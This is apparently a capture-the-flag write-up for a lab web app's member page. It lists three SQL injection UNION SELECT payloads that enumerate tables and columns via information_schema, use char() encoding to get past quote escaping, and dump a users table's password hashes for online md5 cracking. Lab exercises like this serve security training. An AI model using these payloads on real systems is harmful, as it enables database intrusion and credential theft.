# http://172.28.128.136/?page=member

1. 1 union select TABLE_NAME, 2 from information_schema.tables
   - to get all table's names

2. 1 union select column_name, 2 FROM information_schema.columns WHERE table_name = char(117,115,101,114,115)
   - to get all 'users' table column's names.
   - char(117,115,101,114,115) = users. we need this to avoid mariaDB's magic quotes defence.
3. 1 union select Commentaire, countersign FROM users
   - to get the flag. Decrypt countersign value with md5 - https://md5decrypt.net/en/
